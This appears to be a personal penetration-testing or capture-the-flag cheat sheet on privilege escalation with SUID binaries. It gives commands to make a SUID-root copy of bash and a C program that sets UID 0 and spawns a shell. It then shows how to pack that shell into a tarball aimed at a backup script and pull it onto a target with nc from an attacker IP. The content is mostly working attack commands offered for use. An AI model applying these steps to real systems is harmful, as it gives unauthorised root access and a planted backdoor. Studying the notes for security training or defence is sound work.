# import-suid-executable

**Author:** Julien Bongars\
**Date:** 2026-02-09 10:43:18
**Path:**

---

## Method 1

If bash executable is owned by root and has suid bit set can give you a root shell with `bash -p` command. e.g.

```bash
cd /tmp
cp /bin/bash ./bash
sudo chown root:root ./bash
sudo chmod 4755 ./bash 

# !!! THIS BINARY IS EXTREMELY DANGEROUS !!!
# For obvious reasons DELETE IMEDIATELY after use
bash -p
root@localhosh# whoami
root
```

## Method 2

You can compile your own program in C which can change the UID to 0 and spawn a shell

```bash
echo '
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
' > shell.c

sudo su # run as root

# gcc shell.c -o shell -static
gcc shell.c -o shell -static -m32 # for 32 bit
chmod 4755 shell  # suid + executable

# !!! THIS BINARY IS EXTREMELY DANGEROUS !!!
# For obvious reasons DELETE IMEDIATELY after use
./shell
root@localhosh# whoami
root
```

## Making file available for Backup scripts

```bash
# On attacker
mkdir -p evil/var/www/html
# transfer shell into there however you want (nc, wget, etc)
cp shell evil/var/www/html/shell
chmod 4755 evil/var/www/html/shell
tar zcvf evil.tar.gz -C evil .

nc -lvnp 4449 < evil.tar.gz

# On target
nc $ATTACKER_IP 4449 > evil.tar.gz
```
